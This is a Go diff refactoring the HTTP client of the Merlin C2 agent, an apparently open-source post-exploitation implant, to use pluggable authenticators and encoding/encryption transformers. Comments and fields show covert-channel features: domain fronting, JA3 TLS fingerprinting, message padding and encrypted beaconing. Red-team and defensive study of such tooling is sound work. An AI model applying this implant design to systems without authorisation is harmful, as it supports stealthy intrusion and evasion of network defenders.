@@ -25,8 +25,8 @@ import (
 	"bytes"
 	"crypto/sha256"
 	"crypto/tls"
-	"encoding/gob"
 	"fmt"
+	"io"
 	"math/rand"
 	"net"
 	"net/http"
@@ -45,49 +45,55 @@ import (
 	"gopkg.in/square/go-jose.v2/jwt"
 
 	// Merlin
-	"github.com/Ne0nd0g/merlin/pkg/core"
 	"github.com/Ne0nd0g/merlin/pkg/messages"
 
 	// Internal
+	"github.com/Ne0nd0g/merlin-agent/authenticators"
+	"github.com/Ne0nd0g/merlin-agent/authenticators/none"
+	oAuth "github.com/Ne0nd0g/merlin-agent/authenticators/opaque"
 	"github.com/Ne0nd0g/merlin-agent/cli"
-	"github.com/Ne0nd0g/merlin-agent/clients"
-	"github.com/Ne0nd0g/merlin-agent/crypto/opaque"
+	"github.com/Ne0nd0g/merlin-agent/core"
+	transformer "github.com/Ne0nd0g/merlin-agent/transformers"
+	"github.com/Ne0nd0g/merlin-agent/transformers/encoders/gob"
+	"github.com/Ne0nd0g/merlin-agent/transformers/encrypters/jwe"
+	opaque2 "github.com/Ne0nd0g/merlin/pkg/opaque"
 )
 
 // Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
 type Client struct {
-	clients.MerlinClient
-	Client     *http.Client // Client to send messages with
-	Protocol   string
-	URL        []string          // A slice of URLs to send messages to (e.g., https://127.0.0.1:443/test.php)
-	Host       string            // HTTP Host header value
-	Proxy      string            // Proxy string
-	JWT        string            // JSON Web Token for authorization
-	Headers    map[string]string // Additional HTTP headers to add to the request
-	secret     []byte            // The secret key used to encrypt communications
-	UserAgent  string            // HTTP User-Agent value
-	PaddingMax int               // PaddingMax is the maximum size allowed for a randomly selected message padding length
-	JA3        string            // JA3 is a string that represent how the TLS client should be configured, if applicable
-	psk        string            // PSK is the Pre-Shared Key secret the agent will use to start authentication
-	AgentID    uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
-	opaque     *opaque.User      // TODO Turn this into a generic authentication package interface
-	currentURL int               // the current URL the agent is communicating with
+	Authenticator authenticators.Authenticator
+	Client        *http.Client // Client to send messages with
+	Protocol      string
+	URL           []string                  // A slice of URLs to send messages to (e.g., https://127.0.0.1:443/test.php)
+	Host          string                    // HTTP Host header value
+	Proxy         string                    // Proxy string
+	JWT           string                    // JSON Web Token for authorization
+	Headers       map[string]string         // Additional HTTP headers to add to the request
+	secret        []byte                    // The secret key used to encrypt communications
+	UserAgent     string                    // HTTP User-Agent value
+	PaddingMax    int                       // PaddingMax is the maximum size allowed for a randomly selected message padding length
+	JA3           string                    // JA3 is a string that represent how the TLS client should be configured, if applicable
+	psk           string                    // PSK is the Pre-Shared Key secret the agent will use to start authentication
+	AgentID       uuid.UUID                 // AgentID the Agent's unique identifier
+	currentURL    int                       // the current URL the agent is communicating with
+	transformers  []transformer.Transformer // Transformers an ordered list of transforms (encoding/encryption) to apply when constructing a message
 }
 
 // Config is a structure that is used to pass in all necessary information to instantiate a new Client
 type Config struct {
-	AgentID     uuid.UUID // The Agent's UUID
-	Protocol    string    // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
-	Host        string    // Host is used with the HTTP Host header for Domain Fronting activities
-	Headers     string    // Headers is a new-line separated string of additional HTTP headers to add to client requests
-	URL         []string  // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
-	Proxy       string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
-	UserAgent   string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
-	PSK         string    // PSK is the Pre-Shared Key secret the agent will use to start authentication
-	JA3         string    // JA3 is a string that represent how the TLS client should be configured, if applicable
-	Padding     string    // Padding is the max amount of data that will be randomly selected and appended to every message
-	AuthPackage string    // AuthPackage is the type of authentication the agent should use when communicating with the server
-	Opaque      []byte    // Opaque is the byte representation of the EnvU object used with the OPAQUE protocol (future use)
+	AgentID      uuid.UUID // AgentID the Agent's UUID
+	Protocol     string    // Protocol contains the transportation protocol the agent is using (i.e. http2 or http3)
+	Host         string    // Host is used with the HTTP Host header for Domain Fronting activities
+	Headers      string    // Headers is a new-line separated string of additional HTTP headers to add to client requests
+	URL          []string  // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
+	Proxy        string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
+	UserAgent    string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
+	PSK          string    // PSK is the Pre-Shared Key secret the agent will use to start authentication
+	JA3          string    // JA3 is a string that represent how the TLS client should be configured, if applicable
+	Padding      string    // Padding is the max amount of data that will be randomly selected and appended to every message
+	AuthPackage  string    // AuthPackage is the type of authentication the agent should use when communicating with the server
+	Opaque       []byte    // Opaque is the byte representation of the EnvU object used with the OPAQUE protocol (future use)
+	Transformers string    // Transformers is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
 }
 
 // New instantiates and returns a Client that is constructed from the passed in Config
@@ -103,6 +109,36 @@ func New(config Config) (*Client, error) {
 		Proxy:     config.Proxy,
 		JA3:       config.JA3,
 		psk:       config.PSK,
+	}
+
+	// Authenticator
+	switch strings.ToLower(config.AuthPackage) {
+	case "none":
+		client.Authenticator = none.New(config.AgentID)
+	case "opaque":
+		client.Authenticator = oAuth.New(config.AgentID)
+	default:
+		return nil, fmt.Errorf("an authenticator must be provided (e.g., 'none' or 'opaque'")
+	}
+
+	// Transformers
+	transforms := strings.Split(config.Transformers, ",")
+	for _, transform := range transforms {
+		var t transformer.Transformer
+		switch strings.ToLower(transform) {
+		case "gob-base":
+			t = gob.NewEncoder(gob.BASE)
+		case "gob-string":
+			t = gob.NewEncoder(gob.STRING)
+		case "jwe":
+			t = jwe.NewEncrypter()
+		default:
+			err := fmt.Errorf("clients/http.New(): unhandled transform type: %s", transform)
+			if err != nil {
+				return nil, err
+			}
+		}
+		client.transformers = append(client.transformers, t)
 	}
 
 	// Set secret for JWT and JWE encryption key from PSK
@@ -151,6 +187,8 @@ func New(config Config) (*Client, error) {
 
 	cli.Message(cli.INFO, "Client information:")
 	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", client.Protocol))
+	cli.Message(cli.INFO, fmt.Sprintf("\tAuthenticator: %s", client.Authenticator))
+	cli.Message(cli.INFO, fmt.Sprintf("\tTransforms: %+v", client.transformers))
 	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %v", client.URL))
 	cli.Message(cli.INFO, fmt.Sprintf("\tUser-Agent: %s", client.UserAgent))
 	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Host Header: %s", client.Host))
@@ -321,32 +359,15 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 		m.Padding = core.RandStringBytesMaskImprSrc(rand.Intn(client.PaddingMax))
 	}
 
-	var returnMessage messages.Base
-
-	// Convert messages.Base to gob
-	messageBytes := new(bytes.Buffer)
-	errGobEncode := gob.NewEncoder(messageBytes).Encode(m)
-	if errGobEncode != nil {
-		err = fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", messages.String(m.Type), errGobEncode.Error())
+	// Construct the message running it through all the configured transforms
+	data, err := client.Construct(m)
+	if err != nil {
+		err = fmt.Errorf("clients/http.Send(): there was an error constructing the message: %s", err)
 		return
 	}
 
-	// Get JWE
-	jweString, errJWE := core.GetJWESymetric(messageBytes.Bytes(), client.secret)
-	if errJWE != nil {
-		err = fmt.Errorf("there was an error getting a symetric JWE while trying to send a message: %s", errJWE)
-		return
-	}
-
-	// Encode JWE into gob
-	jweBytes := new(bytes.Buffer)
-	errJWEBuffer := gob.NewEncoder(jweBytes).Encode(jweString)
-	if errJWEBuffer != nil {
-		err = fmt.Errorf("there was an error encoding the %s JWE string to a gob:\r\n%s", messages.String(m.Type), errJWEBuffer.Error())
-		return
-	}
-
-	req, reqErr := http.NewRequest("POST", client.URL[client.currentURL], jweBytes)
+	// Build the POST request
+	req, reqErr := http.NewRequest("POST", client.URL[client.currentURL], bytes.NewReader(data))
 	if reqErr != nil {
 		err = fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
 		return
@@ -423,8 +444,14 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 		break
 	case 401:
 		cli.Message(cli.NOTE, "Server returned a 401, re-registering and re-authenticating this orphaned agent")
-		returnMessage, err = client.Auth("opaque", true)
-		returnMessages = append(returnMessages, returnMessage)
+		//returnMessage, err = client.Auth("opaque", true)
+		//returnMessages = append(returnMessages, returnMessage)
+		base := messages.Base{
+			ID:      client.AgentID,
+			Type:    messages.OPAQUE,
+			Payload: opaque2.Opaque{Type: opaque2.ReRegister},
+		}
+		err = client.Authenticate(base)
 		return
 	default:
 		err = fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
@@ -456,21 +483,20 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 		return
 	}
 
-	// Decode GOB from server response into JWE
-	errD := gob.NewDecoder(resp.Body).Decode(&jweString)
-	if errD != nil {
-		err = fmt.Errorf("there was an error decoding the gob message:\r\n%s", errD.Error())
+	data, err = io.ReadAll(resp.Body)
+	if err != nil {
+		err = fmt.Errorf("clients/http.Send(): there was an error reading the response body to bytes: %s", err)
 		return
 	}
 
-	// Decrypt JWE to messages.Base
-	respMessage, errDecrypt := core.DecryptJWE(jweString, client.secret)
-	if errDecrypt != nil {
-		err = fmt.Errorf("there was an error decrypting the returned JWE after sending a message: %s", errDecrypt)
+	var respMessage messages.Base
+	respMessage, err = client.Deconstruct(data)
+	if err != nil {
+		err = fmt.Errorf("clients/http.Send(): there was an error deconstructing the HTTP response data: %s", err)
 		return
 	}
 
-	// Update the JWT, if any
+	// Update the Agent's JWT if one was returned by the server in the response message
 	if respMessage.Token != "" {
 		client.JWT = respMessage.Token
 	}
@@ -523,22 +549,106 @@ func (client *Client) Get(key string) string {
 	}
 }
 
-// Auth is the top-level function used to authenticate an agent to server using a specific authentication protocol
-// register is specific to OPAQUE where the agent must register with the server before it can authenticate
-func (client *Client) Auth(auth string, register bool) (messages.Base, error) {
-	switch strings.ToLower(auth) {
-	case "opaque":
-		return client.opaqueAuth(register)
-	default:
-		return messages.Base{}, fmt.Errorf("unknown authentication type: %s", auth)
+// Authenticate is the top-level function used to authenticate an agent to server using a specific authentication protocol
+// The function must take in a Base message for when the C2 server requests re-authentication through a message
+func (client *Client) Authenticate(msg messages.Base) (err error) {
+	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Authenticate(): entering into function with message: %+v", msg))
+	var authenticated bool
+	// Reset the Agent's PSK
+	k := sha256.Sum256([]byte(client.psk))
+	client.secret = k[:]
+
+	// Add Agent generated JWT from Agent's PSK
+	client.JWT, err = client.getJWT()
+	if err != nil {
+		return
 	}
 
+	// Repeat until authenticator is complete and Agent is authenticated
+	for {
+		msg, authenticated, err = client.Authenticator.Authenticate(msg)
+		if err != nil {
+			return
+		}
+
+		// Once authenticated, update the client's secret used to encrypt messages
+		if authenticated {
+			var key []byte
+			key, err = client.Authenticator.Secret()
+			if err != nil {
+				return
+			}
+			// Don't update the secret if the authenticator returned an empty key
+			if len(key) > 0 {
+				client.secret = key
+			}
+		}
+
+		// Send the message to the server
+		var msgs []messages.Base
+		msgs, err = client.Send(msg)
+		if err != nil {
+			return
+		}
+
+		// Add response message to the next loop iteration
+		if len(msgs) > 0 {
+			msg = msgs[0]
+		}
+
+		// If the Agent is authenticated, exit the loop and return the function
+		if authenticated {
+			return
+		}
+	}
 }
 
-// Initial executes the specific steps required to establish a connection with the C2 server and checkin or register an agent
-func (client *Client) Initial(agent messages.AgentInfo) (messages.Base, error) {
-	cli.Message(cli.DEBUG, "Entering clients.http.Initial function")
-	cli.Message(cli.DEBUG, fmt.Sprintf("Input AgentInfo:\r\n%+v", agent))
-	// Authenticate
-	return client.Auth("opaque", true)
+// Construct takes in a messages.Base structure that is ready to be sent to the server and runs all the configured transforms
+// on it to encode and encrypt it.
+func (client *Client) Construct(msg messages.Base) (data []byte, err error) {
+	for i := len(client.transformers); i > 0; i-- {
+		if i == len(client.transformers) {
+			// First call should always take a Base message
+			data, err = client.transformers[i-1].Construct(msg, client.secret)
+		} else {
+			data, err = client.transformers[i-1].Construct(data, client.secret)
+		}
+		if err != nil {
+			return nil, fmt.Errorf("clients/http.Construct(): there was an error calling the transformer construct function: %s", err)
+		}
+	}
+	return
+}
+
+// Deconstruct takes in data returned from the server and runs all the Agent's transforms on it until
+// a messages.Base structure is returned. The key is used for decryption transforms
+func (client *Client) Deconstruct(data []byte) (messages.Base, error) {
+	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Deconstruct(): entering into function with message: %+v", data))
+
+	for _, transform := range client.transformers {
+		//fmt.Printf("Transformer %T: %+v\n", transform, transform)
+		ret, err := transform.Deconstruct(data, client.secret)
+		if err != nil {
+			return messages.Base{}, err
+		}
+		switch ret.(type) {
+		case []uint8:
+			data = ret.([]byte)
+		case string:
+			data = []byte(ret.(string)) // Probably not what I should be doing
+		case messages.Base:
+			//fmt.Printf("pkg/listeners.Deconstruct(): returning Base message: %+v\n", ret.(messages.Base))
+			return ret.(messages.Base), nil
+		default:
+			return messages.Base{}, fmt.Errorf("clients/http.Deconstruct(): unhandled data type for Deconstruct(): %T", ret)
+		}
+	}
+	return messages.Base{}, fmt.Errorf("clients/http.Deconstruct(): unable to transform data into messages.Base structure")
+}
+
+// Initial contains all the steps the agent and/or the communication profile need to take to set up and initiate
+// communication with server. If the agent needs to authenticate before it can send messages, that process will occur here.
+func (client *Client) Initial() (err error) {
+	cli.Message(cli.DEBUG, "clients/http.Initial(): entering into function")
+	return client.Authenticate(messages.Base{})
 }
